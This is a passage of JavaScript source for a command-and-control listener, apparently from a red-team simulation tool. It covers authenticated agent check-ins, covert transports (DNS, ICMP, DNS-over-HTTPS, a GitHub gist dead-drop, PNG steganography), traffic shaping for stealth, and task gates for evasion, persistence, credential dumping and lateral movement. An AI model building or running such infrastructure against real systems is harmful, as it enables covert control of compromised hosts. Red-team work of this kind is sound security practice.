// VARVEL — governed callback channel (post-ex SIMULATION, range/loopback only).
//
// Design reference: HYDRA's FangListener.cs (reviewed with Jack, 2026-07-30) — a good
// listener with real weaknesses. This channel keeps Fang's strengths and fixes its gaps,
// then adds the governance layer HYDRA has by design no interest in:
//
//   KEPT (Fang's good ideas)
//   · Minimal HTTP check-in/task/result protocol with empty-204 semantics
//   · 204-UNIFORM rejections — a denied check-in is indistinguishable from an idle one
//     (no behavioral fingerprint for an observer), kill-list included
//   · Bounded per-agent queues, body cap, strict request hygiene
//
//   FIXED (Fang's weaknesses — the "better than HYDRA" bar, in code)
//   · AUTHENTICATED check-ins. Fang authenticates NOTHING: the agent ID in a cookie is a
//     bare, sniffable, guessable bearer string — anyone who learns it can pull that
//     agent's tasks or forge its results. Here every agent is issued a 128-bit token at
//     registration and every request carries HMAC-SHA256(token, id:seq:context) — the ID
//     alone is worthless.
//   · REPLAY PROTECTION. Per-agent strictly-increasing sequence numbers; a replayed or
//     stale check-in is rejected (204-uniform) and AUDITED. Fang replays freely.
//   · REAL TASK CORRELATION. Results echo their taskId (UUID); Fang tags results with a
//     single "last sent command" byte, which mis-tags whenever results arrive out of order.
//   · node:http's parser instead of a hand-rolled one — Fang's manual header scan has the
//     usual edge cases; the standard parser doesn't.
//
//   GOVERNED (the Enclave layer)
//   · arming requires the engagement's SIGNED SCOPE; the channel binds loopback by default
//   · non-loopback check-ins must come from INSIDE the signed CIDR ring — anything else is
//     rejected (204-uniform) and recorded as an audit event
//   · every registration, check-in, task, result, rejection, and kill is emitted to the
//     audit callback — the channel is quiet against observers and loud in the ledger
//
// This is the channel/protocol/queueing layer — it ships no payload and no implant logic.
// The "agent" is any HTTP client speaking the protocol (a range simulator, a test fixture,
// or — when Jack says so — an authorized artifact on the practice range).

import http from 'node:http';
import https from 'node:https';
import crypto from 'node:crypto';
import net from 'node:net';
import tls from 'node:tls';
import { readFileSync, existsSync } from 'node:fs';
import { join as pathJoin } from 'node:path';
import { malleableProfile, shapeProfile, windowIndexAt, windowFlushAt } from './malleable.mjs';
import { encodeQuery, decodeQuery, encodeReply, b32decode } from './dnscodec.mjs';
import { parseDnsQuery, craftDnsResponse } from './dnswire.mjs';
import { encodeStgPng, decodeStgPng, stgCapacity, STG_PROFILES, STG_DEFAULTS } from './stegocodec.mjs';
import { DOH_LAB_CERT, DOH_LAB_KEY } from './doh-labcert.mjs';
import { inAnyCidr, isLoopback, parseIp } from './ipaddr.mjs';
import { openTunnel } from './ghost.mjs';
import { icmpPacket, parseIcmpPacket, chunkPayload, reassemble } from './icmpcodec.mjs';
import { WsParser, WsError, buildFrame, acceptKey, OP_PING, OP_PONG, OP_CLOSE } from './wsframe.mjs';
import { deriveVerifyKey, pipeNameFor, validLinkId } from './pipelink.mjs';
import { deriveEncKey, sealBytes, openBytes, isSealedBytes, sealString, isSealedString, normalizeEncMode } from './envelope.mjs';
import { Settings } from './settings.mjs';
import { upsFromComments, downCommentBody, GHC2_RATE } from './ghc2.mjs';
import { INLINE_DOTNET_KIND, parseInlineSpec, inlineDotnetGate } from './inlineexec.mjs';
import { EVASION_KINDS, EVASION_TECHNIQUES, EVASION_RECIPES, parseEvasionSpec, evasionGate, parseEvasionEvidence } from './evasion.mjs';
import { PERSIST_KINDS, parsePersistSpec, persistGate, persistSpecSha256, parsePersistEvidence } from './persist.mjs';
import { EXECPROXY_KINDS, parseExecProxySpec, execProxyGate, execProxySpecSha256, parseExecProxyEvidence } from './execproxy.mjs';
import { ADROAST_KINDS, parseAdRoastSpec, adRoastGate, adRoastSpecSha256, parseAdRoastEvidence } from './adroast.mjs';
import { LATERAL_KINDS, LATERAL_KIND_EXEC, parseLateralSpec, lateralGate, lateralScopeCheck, lateralSpecSha256, parseLateralEvidence } from './lateralexec.mjs';
import { CRED_KINDS, parseCredSpec, credAccessGate, credSpecSha256, parseCredEvidence } from './credaccess.mjs';
import { gradeAgentTransports, rankTransports } from './transport-grade.mjs';
import { normalizeTlsVerdict } from './tlsinspect.mjs';
import { scoreFlow } from './beaconscore.mjs';
import { analyzeCommandStream } from './agentsig.mjs';
import { createHttpObserver } from '../tools/fporacle.mjs';
import dgram from 'node:dgram';
import { spawn as defaultSpawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const MAX_BODY = 4 * 1024 * 1024;      // 4MB result cap (Fang's OOM guard — kept)
const MAX_RESULTS = 1000;              // per-agent result buffer, drop-oldest
const MAX_TASKS = 1000;                // per-agent task queue, drop-oldest
const MAX_ARTIFACT_BYTES = 2 * 1024 * 1024; // per-artifact cap (v1; chunking later)
const MAX_ARTIFACTS = 50;              // staging registry cap, drop-oldest
const MAX_FLOW_EVENTS = 128;           // per-agent flow ring cap (gap#6), drop-oldest

// CIDR membership for the check-in ring — v4 + v6 via the shared, audited math in
// engine/ipaddr (family-strict, v4-mapped collapses to v4). Loopback is ALWAYS
// in-scope: the channel's primary home is the practice range / simulation on this
// host. ALL of 127.0.0.0/8 is loopback, not just 127.0.0.1.
export function ipAllowed(ip, cidrs = []) {
  if (!ip) return false;
  if (isLoopback(ip)) return true;
  return inAnyCidr(ip, cidrs);
}

const hmac = (token, msg) => crypto.createHmac('sha256', token).update(msg).digest('hex');
const sha256 = (buf) => crypto.createHash('sha256').update(buf).digest('hex');

// Resolve the python interpreter for the native ICMP bridge (agents/icmp-bridge.py), in
// honesty order: an explicit override (icmp.python / VARVEL_ICMP_PYTHON) → this host's
// real python at %LOCALAPPDATA%\Python\bin\python.exe (C:\Users\Jack\AppData\Local\...
// on the dev box) → bare 'python' on PATH. The PATH fallback may be the WindowsApps
// STORE STUB — it launches cleanly, nags "Python was not found..." on stderr and runs
// nothing, so spawn success proves NOTHING; the capability window in _armIcmp() is the
// only honest verdict there.
export function resolvePython(override = null, env = process.env, exists = existsSync) {
  if (override) return { python: String(override), via: 'override' };
  const local = env.LOCALAPPDATA ? pathJoin(env.LOCALAPPDATA, 'Python', 'bin', 'python.exe') : null;
  if (local && exists(local)) return { python: local, via: 'local' };
  return { python: 'python', via: 'path' };
}

// The store stub's stderr nag — its signature, matched case-insensitively.
const PY_STORE_STUB = /python was not found/i;

// ——— Listener upstream proxy (operator directive, 2026-08-27) ———
// The channel's own UPSTREAM legs (today: the ghc SaaS mailbox poll — the one place the
// listener itself dials out, upstream of the agent channel) ride the operator's proxy
// chain when one is configured:
//   constructor option `upstreamProxy`  >  env VARVEL_UPSTREAM_PROXY  >  setting
//   'channel.upstreamProxy'.  http:// and socks5h:// URLs only (the 'h' = the PROXY
//   resolves names — a stealth listener never resolves a SaaS name locally).
// FAIL-CLOSED at both ends: a CONFIGURED-but-malformed value throws UpstreamProxyError at
// construction (never silently direct — a stealth misconfiguration must not leak), and a
// configured-but-unreachable/refusing proxy fails the leg with the same named error at
// dial time (the ghc client's never-throw contract lands it in the audit stream as data).
// UNCONFIGURED = byte-identical to before: no agents are built, nothing is threaded.
export class UpstreamProxyError extends Error {
  constructor(message, opts) {
    super(message, opts);
    this.name = 'UpstreamProxyError';
    this.code = 'UPSTREAM_PROXY';
  }
}

// Parse an upstream-proxy URL into a ghost-chain hop ({ scheme, host, port, user, pass })
// or null when unset. Throws UpstreamProxyError on anything malformed or unsupported —
// plain socks5:// included: local-side DNS of the target name is exactly the leak a
// stealth listener configures a chain to prevent, so only socks5h is accepted.
export function parseUpstreamProxy(value) {
  const s = String(value == null ? '' : value).trim();
  if (!s) return null;
  let u;
  try { u = new URL(s); } catch { throw new UpstreamProxyError('upstream proxy is not a URL: ' + s); }
  const scheme = u.protocol.replace(':', '').toLowerCase();
  if (scheme !== 'http' && scheme !== 'socks5h') {
    throw new UpstreamProxyError('upstream proxy scheme must be http:// or socks5h:// (got ' + (scheme || 'none') + ') — socks5h ONLY: the proxy resolves names, a stealth listener never resolves locally');
  }
  // URL keeps v6 hosts bracketed ('[::1]'); the dialer wants the bare literal.
  const host = u.hostname.replace(/^\[|\]$/g, '');
  if (!host || (host.includes(':') && !parseIp(host))) throw new UpstreamProxyError('upstream proxy URL has no usable host: ' + s);
  const port = Number(u.port) || (scheme === 'http' ? 80 : 1080);
  if (!Number.isInteger(port) || port < 1 || port > 65535) throw new UpstreamProxyError('upstream proxy port out of range: ' + s);
  // ghost's chain vocabulary (engine/ghost parseChain): 'http' hops ride HTTP CONNECT,
  // 'socks5' hops do the RFC 1928 handshake with proxy-side DNS (socks5Connect's DOMAIN
  // form IS socks5h semantics).
  return { scheme: scheme === 'socks5h' ? 'socks5' : 'http', host, port, user: decodeURIComponent(u.username || ''), pass: decodeURIComponent(u.password || '') };
}

// The http(s) Agents threaded into an attached mailbox client (Ghc2Api's `agents` knob —
// the repo's standing ghost-chain idiom, cf. GhostHttpAgent/GhostHttpsAgent). EVERY
// connection they create dials through the channel's upstream proxy; a dial failure is the
// named fail-closed error, never a quiet direct socket.
class UpstreamHttpAgent extends http.Agent {
  constructor(dial) { super(); this._dial = dial; }
  createConnection(opts, cb) { this._dial(opts, cb); }
}
class UpstreamHttpsAgent extends https.Agent {
  constructor(dial) { super(); this._dial = dial; }
  createConnection(opts, cb) { this._dial(opts, cb); }
}

// The udp6 counterpart of the configured DNS bind (the dual-bind, work of the 2026-08-04
// follow-up): the v4 ANY maps to the v6 ANY ('::'), loopback maps to loopback ('::1'), a
// v6 bind maps to itself (the udp4 attempt then fails on v6-only hosts — a named gap, not
// a crash). A SPECIFIC v4 NIC bind has NO honest counterpart: binding '::' would expose
// the wire on v6 interfaces the operator deliberately scoped away from, so null here —
// the gap is NAMED ('dns.bind-gap'), never guessed.
export function dnsV6Counterpart(bind) {
  const p = parseIp(bind);
  if (!p) return null;                  // hostname binds: no derivation (v6 skipped, named)
  if (p.fam === 6) return p.text;
  if (p.v4 === 0) return '::';          // 0.0.0.0 -> :: (both families, one socket each)
  if (isLoopback(p.text)) return '::1'; // the range doctrine: loopback stays loopback
  return null;
}

// The fleet transport vocabulary for failover bookkeeping (gap#5 + gap#2's doh + gap#4's ws
// + gap#4b's smb — the pivot-mesh LINK transport: a child's check-ins arrive relayed
// through its parent's pipe; the relay route tags the child's buckets 'smb').
// + ghc: the cloud/SaaS dead-drop transport (GitHub gist-comment mailbox, engine/ghc2) —
// check-ins arrive via the channel-side mailbox poll, never via a socket to us.
// + stg: the steganography fallback wire (task/result envelopes inside PNG images,
// engine/stegocodec) — image-carried envelopes over ordinary HTTP asset fetches.
const KNOWN_TRANSPORTS = new Set(['http', 'dns', 'icmp', 'doh', 'ws', 'smb', 'ghc', 'stg']);

// Resolve an operator-supplied PEM: an inline PEM string passes through; anything else
// is treated as a filesystem path. Returns null when neither reads (the caller fails
// loudly — a silently-minted fallback would lie about what cert is on the wire).
function pemOrPath(v) {
  const s = String(v || '').trim();
  if (!s) return null;
  if (s.includes('-----BEGIN')) return s;
  try { return readFileSync(s, 'utf8'); } catch { return null; }
}

export class CallbackChannel {
  // scope: the signed engagement scope ({ cidrs }) — arming without it is refused.
  // onEvent(type, obj): the audit tap (wire to the campaign ledger / opsec log).
  constructor({ scope, onEvent, bind = '127.0.0.1', dnsPort = 0, dnsDomain = 'ax.sim', icmp = null, doh = null, ghc = null, stg = null, enc = null, upstreamProxy = null } = {}) {
    if (!scope || !Array.isArray(scope.cidrs)) throw new Error('CallbackChannel: a signed scope ({ cidrs }) is required to arm the channel');
    this.scope = scope;
    this.onEvent = typeof onEvent === 'function' ? onEvent : () => {};
    this.bind = bind;
    this.dnsPort = Number(dnsPort) || 0;   // >0 = also serve REAL DNS-over-UDP wire transport (dual-bind udp4 + udp6)
    this.dnsDomain = dnsDomain;
    // icmp: null, or { python?, script?, spawnFn? } — spawn the raw-socket bridge
    // (agents/icmp-bridge.py) that terminates the ICMP fallback transport for real.
    this.icmp = icmp || null;
    this._icmp = this.icmp ? { armed: false, supported: null, reason: 'bridge not started', liveVerified: false } : null;
    this._icmpChild = null;
    this._icmpCapTimer = null;
    this._icmpMsgId = 0;
    this._icmpFrames = new Map();  // 'src:seq:kind' -> { frames:[], at } frame-level reassembly
    // doh (gap#2): null, or { port, cert?, key? } — serve RFC 8484 DNS-over-HTTPS carrying
    // the SAME governed DNS wire packets as the UDP arm (one shared codec core). Operator
    // PEM strings/paths win; absent both, the static lab-only cert (engine/doh-labcert).
    // port 0 = ephemeral (the real port is reported in dohStatus() after arm).
    this.doh = doh && typeof doh === 'object'
      ? { port: Number(doh.port) || 0, cert: doh.cert || null, key: doh.key || null }
      : null;
    this._doh = this.doh ? { armed: false, port: this.doh.port, certSource: (this.doh.cert && this.doh.key) ? 'provided' : 'lab' } : null;
    this._dohServer = null;
    // ghc (cloud/SaaS dead-drop, engine/ghc2): null, or { client, intervalSec } — the
    // client is any object with listComments()/createComment() (Ghc2Api or a test double).
    // intervalSec 0 = MANUAL mode (ghcPollNow() only — the test/embedder drives cadence);
    // >0 starts a jittered poll timer at arm(). The client holds the burner token — the
    // CHANNEL never sees it; audit events carry presence/class only (the token doctrine).
    this.ghc = null;
    this._ghc = null;
    if (ghc && typeof ghc === 'object') this.attachGhc(ghc);
    // stg (roadmap #4, engine/stegocodec): the steganography fallback wire. null = OFF
    // (opt-in, like the other special wires); truthy = serve the image routes on THIS
    // same HTTP listener (GET an innocuous asset path -> PNG carrying the down-envelope;
    // POST an upload-shaped PNG carrying the up-envelope). { profile?, width?, height? }
    // pick the seeded cover scene; counters feed stgStatus() for the /api/channel view.
    this.stg = stg
      ? {
          profile: STG_PROFILES.includes(stg.profile) ? stg.profile : STG_DEFAULTS.profile,
          width: Math.max(16, Math.min(1024, Number(stg.width) || STG_DEFAULTS.width)),
          height: Math.max(16, Math.min(1024, Number(stg.height) || STG_DEFAULTS.height)),
        }
      : null;
    this._stg = this.stg ? { served: 0, uploads: 0, rejected: 0, downFailed: 0 } : null;
    // PER-HOP ENVELOPE ENCRYPTION (engine/envelope): the AEAD content layer for every
    // wire that rides this intake. `enc` (constructor) wins; absent, the engagement's
    // 'enc.mode' setting governs; unreadable settings fail to the backward-compatible
    // 'preferred' (plaintext agents keep working — never a silent lockout on boot).
    // An explicit garbage value THROWS (normalizeEncMode) — a misspelled mode must
    // never silently weaken the policy.
    this.encMode = enc != null
      ? normalizeEncMode(enc)
      : (() => { try { return normalizeEncMode(Settings.for((scope && scope.engagement) || 'default').get('enc.mode')); } catch { return 'preferred'; } })();
    // LISTENER UPSTREAM PROXY (operator directive): the constructor option wins; absent,
    // env VARVEL_UPSTREAM_PROXY; absent, the engagement's 'channel.upstreamProxy' setting.
    // Parsed NOW: a configured-but-malformed proxy is a NAMED throw here (fail-closed at
    // boot — never arm a listener whose stealth config is a lie). Reachability is proven
    // at DIAL time; construction does no network I/O. null = unconfigured = byte-identical.
    this.upstreamProxySource = upstreamProxy != null ? 'option' : (process.env.VARVEL_UPSTREAM_PROXY ? 'env' : 'settings');
    this.upstreamProxy = parseUpstreamProxy(
      upstreamProxy != null ? upstreamProxy
        : (process.env.VARVEL_UPSTREAM_PROXY || (() => { try { return Settings.for((scope && scope.engagement) || 'default').get('channel.upstreamProxy'); } catch { return ''; } })()));
    if (!this.upstreamProxy) this.upstreamProxySource = null;
    this.server = null;
    this._dnsSock = null;
    this._dnsSock6 = null; // the udp6 half of the DNS dual-bind (null until armed)
    // gap#4 ws PUSH transport: live upgrade sessions (for clean disarm). Sessions are
    // also mirrored per-agent as da._ws; this set is the channel-level kill list.
    this._wsSessions = new Set();
    this.port = 0;
    this.agents = new Map();     // agentId -> { token, seq, checkins, firstSeen, lastSeen, remoteIp, killed, tasks:[], results:[] }
    // TLS-inspection posture (lose-point #5, engine/tlsinspect): the last MEASURED egress
    // posture, set by setTlsInspection() (the /api/ghost tlsinspect probe pushes it here).
    // failoverPlan folds it into rankTransports as the inspection factor; the POLICY is
    // re-read live from the engagement's tlsinspect.policy setting on every plan.
    this.tlsInspect = null;
    // fporacle: passive JA4H/shape observer over every request that reaches the channel.
    // Bounded ring, never throws, never changes a response -- self-observation only.
    this._fp = createHttpObserver();
  }

  _emit(type, obj) { try { this.onEvent(type, { at: new Date().toISOString(), ...obj }); } catch { /* audit tap must never break the channel */ } }

  // TLS-inspection posture intake (engine/tlsinspect): record the measured egress
  // posture ('tls-inspected' | 'clean' | 'partial' | 'unknown'). Never throws — an
  // unrecognized posture clears the record (honest: stale posture is worse than none).
  setTlsInspection(posture, { policy, refs, source } = {}) {
    const p = String(posture || '').trim();
    if (!['tls-inspected', 'clean', 'partial', 'unknown'].includes(p)) { this.tlsInspect = null; return null; }
    this.tlsInspect = { posture: p, policy: policy || this._tlsPolicy(), refs: Array.isArray(refs) ? refs.slice(0, 16) : [], source: source || 'probe', at: Date.now() };
    this._emit('channel.tlsinspect', { posture: p, policy: this.tlsInspect.policy, source: this.tlsInspect.source });
    return this.tlsInspect;
  }

  // The engagement's tlsinspect.policy, read LIVE (settings can change mid-engagement);
  // unreadable settings fail to the default 'fail-closed' — the safe end.
  _tlsPolicy() {
    try { return Settings.for((this.scope && this.scope.engagement) || 'default').get('tlsinspect.policy'); } catch { return 'fail-closed'; }
  }

  // Issue an agent credential (at simulated deploy). The TOKEN is the secret — the ID alone
  // proves nothing (this is the authentication Fang doesn't have).
  registerAgent({ label, tags = [] } = {}) {
    const agentId = crypto.randomBytes(6).toString('hex');
    const token = crypto.randomBytes(16).toString('hex');
    this.agents.set(agentId, {
      agentId, label: label || '', tags: tags.slice(0, 8), token, seq: 0, checkins: 0, firstSeen: Date.now(), lastSeen: 0, remoteIp: '', killed: false, tasks: [], results: [], ledger: new Map(),
      // Envelope-encryption state (engine/envelope): null = capability unknown (a
      // plaintext-only agent, or one that hasn't proven itself yet); true = enc-proven
      // (an authenticated ec:1 envelope, or a sealed chunk that OPENED — proof of key
      // possession). The ratchet only moves up; once true, plaintext CONTENT from this
      // agent is refused as a downgrade even in preferred mode.
      enc: null,
      // Transport failover telemetry (gap#5): per-transport observed check-in counts and
      // last-seen stamps feed engine/transport-grade (delivery-HEALTH only, never a
      // detectability claim). assignedTransport = the channel's soft re-tasking state.
      transportCheckins: { http: 0, dns: 0, icmp: 0 }, transportLastSeen: {}, lastTransport: null, assignedTransport: null,
      // Flow-beacon self-test (gap#6): bounded ring of every accepted check-in/push as
      // { t, bytes }, graded at read time by engine/beaconscore. Feature evidence only.
      flowTimes: [],
    });
    this._emit('agent.registered', { agentId, label });
    return { agentId, token };
  }

  // Pivot mesh (gap #4b): enroll a CHILD agent that will reach this channel THROUGH a
  // parent's SMB named-pipe link. The discipline is IDENTICAL to a direct agent — fresh
  // id + 128-bit token, same HMAC/seq/kill-list intake — plus link state: the child record
  // carries via={parent,link,pipe}, and the PARENT is tasked (kind 'link-listen') with the
  // pipe name and the link-scoped VERIFY KEY (HMAC(childToken, 'varvel-link:'+link)) — the
  // parent never holds the child's token, so a compromised parent can relay or drop but
  // can never impersonate the child to this channel.
  registerLinkedAgent({ parentId, linkId, label, tags = [] } = {}) {
    const parent = this.agents.get(parentId);
    if (!parent || parent.killed) return null;
    const link = validLinkId(linkId) ? linkId : crypto.randomBytes(4).toString('hex');
    const { agentId, token } = this.registerAgent({ label, tags });
    const child = this.agents.get(agentId);
    child.via = { parent: parentId, link, pipe: pipeNameFor(link) };
    this._emit('agent.link-enrolled', { agentId, parentId, link, pipe: child.via.pipe });
    // Task the parent to host the link. A still-QUEUED link-listen for the same link gets
    // the new child merged in (no duplicate pipe servers); an already-running parent's
    // sim-agent merges late children into its live hub on receipt (link-listen is
    // idempotent agent-side).
    const childSpec = { a: agentId, k: deriveVerifyKey(token, link) };
    const pending = parent.tasks.find((t) => {
      if (t.kind !== 'link-listen') return false;
      try { return JSON.parse(t.data).link === link; } catch { return false; }
    });
    if (pending) {
      const d = JSON.parse(pending.data);
      d.children.push(childSpec);
      pending.data = JSON.stringify(d); // the ledger holds the same task object
    } else {
      this.task(parentId, 'link-listen', JSON.stringify({ link, pipe: pipeNameFor(link), children: [childSpec] }));
    }
    return { agentId, token, link: { parentId, linkId: link, pipe: child.via.pipe } };
  }

  // The pivot-mesh view: linked agents grouped under their parent + link, built at read
  // time from enrollment state. Backs the cli `pivots` listing off /api/channel's agents.
  pivotsView({ now } = {}) {
    const n = now || Date.now();
    const links = new Map();
    for (const a of this.agents.values()) {
      if (!a.via) continue;
      const key = a.via.parent + ':' + a.via.link;
      if (!links.has(key)) {
        const p = this.agents.get(a.via.parent);
        links.set(key, {
          parentId: a.via.parent, parentLabel: p ? p.label : '', parentHealth: p ? this._health(p, n) : 'gone',
          linkId: a.via.link, pipe: a.via.pipe, children: [],
        });
      }
      links.get(key).children.push({
        agentId: a.agentId, label: a.label, health: this._health(a, n), killed: a.killed,
        checkins: a.checkins, lastSeen: a.lastSeen || null,
      });
    }
    return [...links.values()];
  }

  // Operator metadata: labels + tags are how a real C2 console organizes a fleet.
  renameAgent(agentId, label) {
    const a = this.agents.get(agentId);
    if (!a) return null;
    a.label = String(label || '').slice(0, 60);
    this._emit('agent.renamed', { agentId, label: a.label });
    return a.label;
  }

  // Malleable C2: assign the agent's timing profile (name from MALLEABLE_PROFILES or a
  // custom { intervalMs, jitterMs, burst }). Delivered on its next check-in header —
  // Cobalt-style sleep/jitter as first-class config, governed + audited.
  setProfile(agentId, profile) {
    const a = this.agents.get(agentId);
    if (!a || a.killed) return null;
    a.profile = malleableProfile(profile);
    this._emit('agent.profile', { agentId, profile: a.profile.label });
    return a.profile;
  }

  // MALLEABLE PROFILE LIBRARY v2 (the shaping pack): apply a full WIRE shape — request
  // path templates, header sets, UA families, cadence model (jitterPct, batch/dwell
  // windows, padding) — resolved by engine/malleable.shapeProfile. 'plain' CLEARS the
  // shape (back to today's byte-identical wire). Delivered to the agent as the
  // x-varvel-shape header on every check-in reply (the x-varvel-profile pattern).
  // shapeAt anchors the batch-window schedule BOTH sides derive independently from the
  // shared token (engine/malleable.windowFlushAt) — no coordination channel needed.
  // Unknown names return null (honest refusal — never silently reshape an agent).
  setShapeProfile(agentId, shape) {
    const a = this.agents.get(agentId);
    if (!a || a.killed) return null;
    const s = shapeProfile(shape);
    if (!s) return null;
    // 'plain' — or any custom object with NO active shaping blocks — clears the shape:
    // back to today's byte-identical wire. The OLD shape's routes stay answerable
    // (clearedShapeHttp): the agent may still be polling a stale shaped path, and its
    // reply must carry the plain header or the clear could never reach it.
    if (!s.http && !s.cadence && !s.batch && !s.padding) {
      if (a.shape && a.shape.http) a.clearedShapeHttp = a.shape.http;
      a.shape = null; a.shapeAt = 0; a.shapeCleared = true; // the agent learns the clear via the x-varvel-shape: plain header
      this._emit('agent.shape', { agentId, shape: 'plain' });
      return { name: 'plain', label: s.label };
    }
    if (a.shape && a.shape.http && a.shape.http !== s.http) a.clearedShapeHttp = a.shape.http; // shape->shape: in-flight polls on the old paths stay answered
    a.shape = s;
    a.shapeAt = Date.now();
    a.shapeCleared = false;
    this._emit('agent.shape', { agentId, shape: s.name, batch: !!s.batch, padding: !!s.padding });
    return { name: s.name, label: s.label };
  }

  // Channel-assigned transport switch (gap#5, soft re-tasking): records the operator's
  // intent + audits it. DELIVERY: HTTP agents get an x-varvel-transport header on every
  // /c reply (mirrors the x-varvel-profile pattern); dns/icmp agents get a setTransport
  // key on the NEXT non-empty task reply. The state flips 'assigned' -> 'active' ONLY
  // when an observed check-in arrives on the assigned transport (see _tagTransport) -
  // never on queueing, never on delivery: we claim the agent heard us only when we see it.
  setTransport(agentId, transport) {
    const a = this.agents.get(agentId);
    if (!a || a.killed) return null;
    const t = String(transport || '').trim().toLowerCase();
    if (t !== 'http' && t !== 'dns' && t !== 'icmp' && t !== 'doh' && t !== 'ws' && t !== 'smb' && t !== 'ghc' && t !== 'stg') return null;
    a.assignedTransport = { transport: t, state: 'assigned', at: Date.now() };
    this._emit('agent.transport', { agentId, transport: t });
    return { ...a.assignedTransport };
  }
  tagAgent(agentId, tag, on = true) {
    const a = this.agents.get(agentId);
    if (!a) return null;
    tag = String(tag || '').trim().toLowerCase().slice(0, 24);
    if (!tag) return null;
    const has = a.tags.includes(tag);
    if (on && !has) a.tags.push(tag);
    if (!on) a.tags = a.tags.filter((t) => t !== tag);
    this._emit('agent.tagged', { agentId, tag, on: !!on });
    return a.tags.slice();
  }

  // Queue a task for an agent. Returns the taskId the agent's result will echo.
  // The LEDGER tracks the lifecycle: queued → delivered → resulted (Cobalt-style task view).
  //
  // IN-MEMORY EXECUTION TIER (gap #4 remainder): kind 'inline-dotnet' is gated BEFORE
  // queueing — the engagement must have explicitly enabled exec.inMemory (default OFF)
  // and the spec must parse inside the size cap. A refusal is audited (task.refused) and
  // THROWN with code 'GOVERNANCE' so the API layer can answer 403 loudly — a governed
  // refusal is never mistaken for a missing agent (404) or an idle queue. A queued
  // inline-dotnet task emits 'exec.inline-dotnet' with the assembly's sha256: the bytes
  // never touch disk anywhere, so the hash is the accountability trail.
  //
  // EVASION INTERNALS TIER (stage 1, doctrine 2026-08-12): kinds 'evasion-enable' /
  // 'evasion-restore' / 'evasion-status' ride the SAME governance shape — the engagement
  // must have explicitly enabled exec.evasion (default OFF) and the spec must parse
  // (known techniques only). A queued task emits 'evasion.task' with each technique's
  // recipe sha256 (the patch recipe is well-known public tradecraft — the hash pins
  // exactly which bytes were ordered); the agent's result then lands the applied/
  // restored/verified evidence in audit via _intakeResult.
  //
  // GOVERNED PERSISTENCE TIER (roadmap #8): kinds 'persist-install' / 'persist-status' /
  // 'persist-remove' / 'persist-audit' ride the same governance shape — the engagement
  // must have explicitly enabled persist.enabled (default OFF) and the spec must parse
  // (known user-land techniques only; remove needs an explicit scope). A queued task
  // emits 'persist.task' with the sha256 of the normalized spec (the channel never
  // ships a relaunch command line — the agent captures its own); the agent's result
  // lands the installed/removed/remove-failed(status/sweep) evidence via _intakeResult.
  //
  // SIGNED-PROXY EXECUTION TIER (the governed answer to application allowlisting):
  // kinds 'execproxy-run' / 'execproxy-remove' / 'execproxy-status' ride the same
  // governance shape — the engagement must have explicitly enabled exec.proxy
  // (default OFF) and the spec must parse (known techniques, allow-listed exports,
  // explicit remove scope). A queued task emits 'execproxy.task' with the sha256 of
  // the normalized spec; the agent's result lands the ran/removed/remove-failed/
  // status evidence — the sha256 of every file planted or executed — via
  // _intakeResult (engine/execproxy.mjs).
  //
  // GOVERNED AD TIER (lose-point #3): kinds 'adroast-enum' / 'adroast-kerberoast' /
  // 'adroast-asrep' (engine/adroast.mjs), 'lateral-exec' / 'lateral-remove' /
  // 'lateral-status' (engine/lateralexec.mjs) and 'cred-dump' / 'cred-dump-remove' /
  // 'cred-dump-status' (engine/credaccess.mjs) ride the same governance shape —
  // the engagement must have explicitly enabled ad.roast / ad.lateral / cred.access
  // (all default OFF) and the spec must parse. SCOPE: the roast DC and the lateral
  // target must be IP literals INSIDE the signed CIDR ring — out-of-ring is a loud
  // GOVERNANCE refusal before queueing. Queued tasks emit 'adroast.task' /
  // 'lateral.task' / 'cred.task' with the sha256 of the normalized order (the
  // lateral password is NEVER pinned — see lateralSpecSha256); results land the
  // collected hashes / artifact manifests / dump-hash evidence via _intakeResult.
  task(agentId, kind, data) {
    const a = this.agents.get(agentId);
    if (!a || a.killed) return null;
    let inlineSpec = null;
    let evasionSpec = null;
    let persistSpec = null;
    let proxySpec = null;
    let roastSpec = null;
    let lateralSpec = null;
    let credSpec = null;
    if (String(kind) === INLINE_DOTNET_KIND) {
      const refuse = (reason) => {
        this._emit('task.refused', { agentId, kind: INLINE_DOTNET_KIND, reason });
        const err = new Error('inline-dotnet refused: ' + reason);
        err.code = 'GOVERNANCE';
        throw err;
      };
      const gate = inlineDotnetGate(this.scope && this.scope.engagement);
      if (!gate.ok) refuse(gate.reason);
      try { inlineSpec = parseInlineSpec(data); } catch (e) { refuse((e && e.message) || String(e)); }
    }
    if (EVASION_KINDS.has(String(kind))) {
      const refuse = (reason) => {
        this._emit('task.refused', { agentId, kind: String(kind), reason });
        const err = new Error(String(kind) + ' refused: ' + reason);
        err.code = 'GOVERNANCE';
        throw err;
      };
      const gate = evasionGate(this.scope && this.scope.engagement);
      if (!gate.ok) refuse(gate.reason);
      try { evasionSpec = parseEvasionSpec(kind, data); } catch (e) { refuse((e && e.message) || String(e)); }
    }
    if (PERSIST_KINDS.has(String(kind))) {
      const refuse = (reason) => {
        this._emit('task.refused', { agentId, kind: String(kind), reason });
        const err = new Error(String(kind) + ' refused: ' + reason);
        err.code = 'GOVERNANCE';
        throw err;
      };
      const gate = persistGate(this.scope && this.scope.engagement);
      if (!gate.ok) refuse(gate.reason);
      try { persistSpec = parsePersistSpec(kind, data); } catch (e) { refuse((e && e.message) || String(e)); }
    }
    if (EXECPROXY_KINDS.has(String(kind))) {
      const refuse = (reason) => {
        this._emit('task.refused', { agentId, kind: String(kind), reason });
        const err = new Error(String(kind) + ' refused: ' + reason);
        err.code = 'GOVERNANCE';
        throw err;
      };
      const gate = execProxyGate(this.scope && this.scope.engagement);
      if (!gate.ok) refuse(gate.reason);
      try { proxySpec = parseExecProxySpec(kind, data); } catch (e) { refuse((e && e.message) || String(e)); }
    }
    if (ADROAST_KINDS.has(String(kind))) {
      const refuse = (reason) => {
        this._emit('task.refused', { agentId, kind: String(kind), reason });
        const err = new Error(String(kind) + ' refused: ' + reason);
        err.code = 'GOVERNANCE';
        throw err;
      };
      const gate = adRoastGate(this.scope && this.scope.engagement);
      if (!gate.ok) refuse(gate.reason);
      try { roastSpec = parseAdRoastSpec(kind, data); } catch (e) { refuse((e && e.message) || String(e)); }
      // SCOPE: the DC must be an IP literal inside the signed CIDR ring.
      const sc = lateralScopeCheck(roastSpec.dc, this.scope && this.scope.cidrs, 'dc');
      if (!sc.ok) refuse(sc.reason);
    }
    if (LATERAL_KINDS.has(String(kind))) {
      const refuse = (reason) => {
